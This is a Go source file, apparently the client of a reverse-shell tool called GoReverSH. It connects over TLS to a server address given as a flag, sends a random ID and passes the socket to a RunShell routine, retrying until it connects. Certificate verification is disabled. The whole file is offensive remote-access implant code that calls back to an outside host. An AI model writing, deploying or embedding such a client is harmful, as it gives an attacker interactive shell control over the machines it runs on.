package main

import (
	"GoReverSH/config"
	"GoReverSH/pkgclient"
	"GoReverSH/utils"

	"bytes"
	"crypto/rand"
	"crypto/tls"
	"flag"
	"fmt"
	"log"
	"math/big"
	"net"
)

type Option struct {
	LHOST string
	RHOST string
}

//4桁のIDを作成
func genNumStr(len int) string {
	var container string
	var str = "1234567890"
	b := bytes.NewBufferString(str)
	length := b.Len()
	bigInt := big.NewInt(int64(length))
	for i := 0; i < len; i++ {
		randomInt, _ := rand.Int(rand.Reader, bigInt)
		container += string(str[randomInt.Int64()])
	}
	return container
}

/*
func padString(source string, toLength int) string {
	currLength := len(source)
	remLength := toLength - currLength

	for i := 0; i < remLength; i++ {
		source += ":"
	}
	return source
}
*/

func main() {
	config.InitConfig()
	fmt.Println(config.Config)

	certFile, keyFile, err := utils.GenClientCerts()
	if err != nil {
		log.Fatalln(err)
	}
	cert, err := tls.LoadX509KeyPair(certFile, keyFile)
	if err != nil {
		log.Fatalf("Loadkeys : %s", err)
	}
	tlsConfig := &tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
	//config := &tls.Config{InsecureSkipVerify: true}

	server := flag.String("server", "", "target ipaddr")
	port := flag.String("port", "8000", "port")
	flag.Parse()

	var conn net.Conn = nil

	for {
		var err error

		if conn == nil {
			conn, err = tls.Dial("tcp", net.JoinHostPort(*server, *port), tlsConfig)
			if err != nil {
				log.Println(err)
				conn = nil
				continue

			}
			defer fmt.Println("Cleanup")
			defer conn.Close()

			//クライアント名を作成
			//hostName, _ := os.Hostname() //develop
			hostName := "" //debug
			id := genNumStr(4)
			clientName := hostName + id
			//送信
			_, err = conn.Write([]byte(clientName))
			if err != nil {
				fmt.Println("Retry")
				conn = nil
				continue
			}

			//shell
			err = pkgclient.RunShell(conn)
			if err != nil {
				fmt.Println("Retry")
				conn = nil
				continue
			}
		}
	}
}
